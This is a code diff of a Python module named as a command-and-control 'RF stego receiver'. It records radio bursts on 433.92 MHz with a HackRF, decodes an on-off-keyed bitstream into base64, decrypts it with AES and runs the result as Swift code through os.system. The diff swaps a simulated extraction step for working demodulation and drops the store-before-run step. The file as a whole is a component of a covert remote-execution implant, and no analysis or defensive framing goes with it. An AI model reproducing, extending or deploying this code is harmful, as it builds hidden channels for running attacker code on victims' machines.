@@ -1,52 +1,71 @@
 #!/usr/bin/env python3
 # File: modules/c2/rf_stego_receiver.py
 
-import os
-import sys
-import time
-import json
+import numpy as np
 import base64
-import hashlib
+import os
+import json
 import subprocess
+from datetime import datetime
+from pathlib import Path
 from Crypto.Cipher import AES
 from Crypto.Hash import HMAC, SHA256
-from pathlib import Path
-from datetime import datetime
-import tempfile
 
-RECEIVE_DIR = "captures/stego_signals"
-PAYLOAD_OUTPUT_DIR = "payloads/received"
+# Constants
+CAPTURE_DIR = "rf_captures"
+DECRYPTED_PAYLOAD_DIR = "payloads"
+KEY_FILE = "keys/aes_key.txt"
 LOG_FILE = "logs/rf_stego_receiver.log"
-KEY_FILE = "config/aes_shared_key.txt"
+SAMPLE_RATE = "2M"
+CENTER_FREQ = "433.92M"
+DURATION = 5  # seconds
+THRESHOLD = 0.01
 
-os.makedirs(RECEIVE_DIR, exist_ok=True)
-os.makedirs(PAYLOAD_OUTPUT_DIR, exist_ok=True)
-Path(LOG_FILE).parent.mkdir(parents=True, exist_ok=True)
+Path(CAPTURE_DIR).mkdir(parents=True, exist_ok=True)
+Path(DECRYPTED_PAYLOAD_DIR).mkdir(parents=True, exist_ok=True)
+Path(os.path.dirname(LOG_FILE)).mkdir(parents=True, exist_ok=True)
 
 def log(msg):
     with open(LOG_FILE, "a") as f:
         f.write(f"[{datetime.utcnow()}] {msg}\n")
     print(msg)
 
-def listen_for_signal(duration=10, center_freq="433.92M", sample_rate="2M"):
-    output_file = f"{RECEIVE_DIR}/burst_{int(time.time())}.bin"
+def capture_rf_signal():
+    timestamp = int(datetime.utcnow().timestamp())
+    output_file = f"{CAPTURE_DIR}/rf_burst_{timestamp}.bin"
     cmd = [
         "hackrf_transfer", "-r", output_file,
-        "-f", center_freq, "-s", sample_rate,
-        "-n", str(int(sample_rate.replace("M", "")) * 1_000_000 * duration)
+        "-f", CENTER_FREQ, "-s", SAMPLE_RATE,
+        "-n", str(int(SAMPLE_RATE.replace("M", "")) * 1_000_000 * DURATION)
     ]
-    log(f"[+] Listening for RF stego signal: {center_freq}Hz for {duration}s")
+    log(f"[+] Listening for RF stego signal on {CENTER_FREQ}Hz")
     subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     return output_file
 
-def extract_stego_payload(signal_file):
-    # Simulated extraction (replace with real demod logic)
-    embedded_file = signal_file.replace(".bin", ".payload.b64")
-    if os.path.exists(embedded_file):
-        with open(embedded_file, "r") as f:
-            return f.read()
-    else:
-        log("[!] No embedded payload found.")
+def demodulate_ook(signal_file):
+    raw = np.fromfile(signal_file, dtype=np.uint8)
+    signal = raw.astype(np.float32) - 127.5
+    signal /= 127.5
+
+    envelope = np.abs(signal)
+    mean_val = np.mean(envelope)
+    bitstream = ['1' if s > mean_val + THRESHOLD else '0' for s in envelope]
+
+    bitstring = ''.join(bitstream)
+    bytes_out = [bitstring[i:i + 8] for i in range(0, len(bitstring), 8)]
+    decoded = b''
+
+    for b in bytes_out:
+        try:
+            decoded += int(b, 2).to_bytes(1, 'big')
+        except ValueError:
+            continue
+
+    try:
+        base64_data = decoded.decode()
+        return base64_data.strip()
+    except UnicodeDecodeError:
+        log("[!] Decoding error. No payload extracted.")
         return None
 
 def load_key():
@@ -69,45 +88,37 @@ def decrypt_payload(encoded_data, key):
         plaintext = cipher.decrypt(ciphertext)
         return plaintext.rstrip(b"\x00")
     except Exception as e:
-        log(f"[!] Decryption or HMAC verification failed: {e}")
+        log(f"[!] Decryption failed: {e}")
         return None
 
-def execute_payload(payload_bytes):
+def execute_payload(payload_code):
     try:
-        with tempfile.NamedTemporaryFile(delete=False, mode="wb", suffix=".swift") as f:
-            f.write(payload_bytes)
-            swift_file = f.name
-
-        log(f"[+] Executing received payload: {swift_file}")
-        subprocess.run(["swift", swift_file], check=True)
-        os.remove(swift_file)
+        swift_path = f"{DECRYPTED_PAYLOAD_DIR}/extracted_payload.swift"
+        with open(swift_path, "wb") as f:
+            f.write(payload_code)
+        log(f"[+] Swift payload extracted: {swift_path}")
+        os.system(f"swift {swift_path}")
     except Exception as e:
         log(f"[!] Execution failed: {e}")
 
-def store_payload(payload_bytes):
-    ts = int(time.time())
-    output_file = f"{PAYLOAD_OUTPUT_DIR}/payload_{ts}.swift"
-    with open(output_file, "wb") as f:
-        f.write(payload_bytes)
-    log(f"[+] Stored decrypted payload to {output_file}")
-    return output_file
-
 def main():
-    signal_file = listen_for_signal()
-    encoded = extract_stego_payload(signal_file)
-    if not encoded:
+    log("[*] RF Stego Receiver started.")
+    signal_file = capture_rf_signal()
+    b64_data = demodulate_ook(signal_file)
+
+    if not b64_data:
+        log("[!] No payload detected in RF signal.")
         return
 
     key = load_key()
-    decrypted = decrypt_payload(encoded, key)
-    if not decrypted:
-        log("[!] No valid payload recovered.")
-        return
+    decrypted = decrypt_payload(b64_data, key)
+    if decrypted:
+        execute_payload(decrypted)
+        log("[+] Payload decrypted and executed.")
+    else:
+        log("[!] Payload decryption failed.")
 
-    store_payload(decrypted)
-    execute_payload(decrypted)
-
-    log("[*] RF stego receiver module completed.")
+    log("[*] Receiver finished.")
 
 if __name__ == "__main__":
     main()
